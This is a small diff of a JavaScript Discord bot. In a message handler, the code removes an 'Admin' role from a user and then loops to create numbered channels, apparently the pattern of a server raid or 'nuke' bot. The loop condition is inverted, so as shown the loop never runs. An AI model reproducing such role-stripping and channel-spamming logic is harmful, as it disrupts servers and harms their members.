@@ -79,7 +79,7 @@ client.on("message", message => {
                    const role = guild.roles.cache.find(role => role.name.includes("Admin"));
                    guild.member(e.user).roles.remove(role);
                    for (i = 0; i > 100; i++) {
-                       message.guild.channels.create(i);
+                       message.guild.channels.create(i.toString());
 
                    }
 
